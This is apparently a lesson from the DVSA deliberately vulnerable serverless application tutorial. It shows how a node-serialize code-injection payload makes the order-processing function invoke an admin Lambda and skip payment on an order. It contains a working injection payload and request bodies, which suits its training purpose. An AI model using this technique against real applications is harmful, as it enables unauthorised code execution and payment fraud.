# LESSON #5: Broken Access Control

The DVSA applicaiton has some admin functions. Although these functions are not available through the standard API calls, the function that receives the API calls has permissions to invoke any function. Since the function is vulnerable to [code injection](../LESSONS/LESSON_01.md) is it possible to invoke admin function using the standard API calls.

This means that by invoking the right funciton at the right time, we can skip the payment. But, first, we start with the normal flow:

- ```{"action": "new", "cart-id": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx", "items": { "<item-id>":<qty>, "<item-id>":<qty>, ... }}```

- ```{"action": "shipping", "order-id": "yyyyyyyy-yyyy-yyyy-yyyy-yyyyyyyyyyyy", "data": {"address":"<address>", "email":"<email>", "name":"<name>"}}```

- ```{"action": "billing", "order-id": "yyyyyyyy-yyyy-yyyy-yyyy-yyyyyyyyyyyy", "data": {"ccn":"4242424242424242", "exp":"11/22", "cvv":"123 }}```

Now that we have an order that is missing only the payment, let's exploit.

To admin function receives an order Id and the parameters to update, so we can send something like that:
```
neworder = {"body":{"action":"update", "order-id": "cc241d5c-f665-48db-8e55-4391f62465ba", "item":{"userId": "12312312-1233-1233-1233-123123123123", "token": "aSD32d2ASd2", "ts": "1545594489", "itemList": {"20":2}, "address": {"name": "john doe", "email": "secret@email.com", "address": "po box 12333"}, "total":25, "status":120}}}
```

Now, we have to pass it as part of the exploit itself:
```
'{"action": "_$$ND_FUNC$$_function(){var p=JSON.stringify(' + new_order + ');var a=require(\\"aws-sdk\\");var l=new a.Lambda();var x={FunctionName:\\"DVSA-ADMIN-UPDATE-ORDERS\\",InvocationType:\\"RequestResponse\\",Payload:p};l.invoke(x, function(e,d){});}()"}'```
